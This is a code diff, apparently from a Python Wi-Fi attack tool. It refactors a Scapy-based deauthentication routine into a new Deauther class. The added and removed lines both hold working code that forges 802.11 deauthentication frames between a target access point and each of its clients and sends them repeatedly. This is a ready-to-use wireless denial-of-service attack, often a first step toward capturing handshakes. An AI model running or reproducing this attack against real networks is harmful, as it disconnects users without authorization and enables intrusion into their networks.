@@ -9,6 +9,35 @@ from change_channel import *
 from capture_manager import *
 
 
+class Deauther():
+
+    def __init__(self, ap: AccessPoint, interface_name: str) -> None:
+        self.ap = ap
+        self.interface_name = interface_name
+        self.packet_count = 0
+        self.packets_sent = 0
+
+    def deauth(self) -> None:
+        """Craft and send deauthentication packets"""
+        self.packets_sent = 0
+        # Number of packets to send
+        self.packet_count = 10 * len(self.ap.clients)
+        while not self.packets_sent >= self.packet_count:
+            for client in self.ap.clients:
+                # From AP to client
+                ap_to_client = RadioTap() / Dot11(type=0, subtype=12, addr1=self.ap.bssid,
+                                                    addr2=client, addr3=self.ap.bssid) / Dot11Deauth()
+                # From client to AP
+                client_to_ap = RadioTap() / Dot11(type=0, subtype=12, addr1=client,
+                                                    addr2=self.ap.bssid, addr3=self.ap.bssid) / Dot11Deauth()
+
+                # Send packets and update packet count
+                sendp(ap_to_client, iface=self.interface_name, verbose=False)
+                self.packets_sent += 1
+                sendp(client_to_ap, iface=self.interface_name, verbose=False)
+                self.packets_sent += 1
+
+
 class NetworkController():
 
     def __init__(
@@ -40,8 +69,12 @@ class NetworkController():
         self.stop_changing_channel = threading.Event()
         self.stop_deauth = threading.Event()
 
+        self.deauther = None
         self.deauth_packet_count = 0
         self.max_packets = 0
+
+    def create_deauther(self) -> None:
+        self.deauther = Deauther(self.selected_ap, self.interface_name)
 
     def stop_all(self) -> None:
         self.stop_sniff.set()
@@ -134,26 +167,6 @@ class NetworkController():
         if dest in self.bssid_map.keys() and dest != 'ff:ff:ff:ff:ff:ff':
             if src not in self.bssid_map[dest].clients:
                 self.bssid_map[dest].add_client(src)
-
-    def deauth(self) -> None:
-        """Craft and send deauthentication packets"""
-        self.deauth_packet_count = 0
-        # Number of packets to send
-        self.max_packets = 10 * len(self.selected_ap.clients)
-        while not self.deauth_packet_count >= self.max_packets:
-            for client in self.selected_ap.clients:
-                # From AP to client
-                ap_to_client = RadioTap() / Dot11(type=0, subtype=12, addr1=self.selected_ap.bssid,
-                                                  addr2=client, addr3=self.selected_ap.bssid) / Dot11Deauth()
-                # From client to AP
-                client_to_ap = RadioTap() / Dot11(type=0, subtype=12, addr1=client,
-                                                  addr2=self.selected_ap.bssid, addr3=self.selected_ap.bssid) / Dot11Deauth()
-
-                # Send packets and update packet count
-                sendp(ap_to_client, iface=self.interface_name, verbose=False)
-                self.deauth_packet_count += 1
-                sendp(client_to_ap, iface=self.interface_name, verbose=False)
-                self.deauth_packet_count += 1
 
     def start_sniffing(self, filter: str = '') -> None:
         sniff(
